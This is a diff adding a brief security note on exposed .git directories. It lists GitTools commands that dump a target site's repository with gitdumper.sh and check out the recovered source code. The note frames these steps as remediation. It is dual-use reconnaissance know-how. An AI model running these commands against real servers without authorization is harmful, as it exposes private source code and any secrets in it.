@@ -1,0 +1,26 @@
+.git expose
+
+If you discover the .git directory exposed in a browsable location, it's critical to take immediate action. Exposing .git grants attackers access to source code, risking vulnerability exploitation. Secure the directory to prevent unauthorized access and conduct a comprehensive review to detect and mitigate vulnerabilities.
+
+To address this issue, utilize tools like GitTools:
+
+- Clone the GitTools repository:
+git clone https://github.com/internetwache/GitTools
+
+- Navigate to the Dumper directory:
+cd GitTools/Dumper
+
+- Set executable permissions for gitdumper.sh:
+chmod +x gitdumper.sh
+
+- Execute the script to dump the .git contents:
+./gitdumper.sh http://target.tld/.git/ dest-dir
+
+- Change directory to the destination folder:
+cd dest-dir
+
+- Check out the source code:
+git checkout .
+
+
+This process allows you to access and review the source code obtained from the exposed .git directory. Be sure to investigate thoroughly and address any identified security concerns promptly.
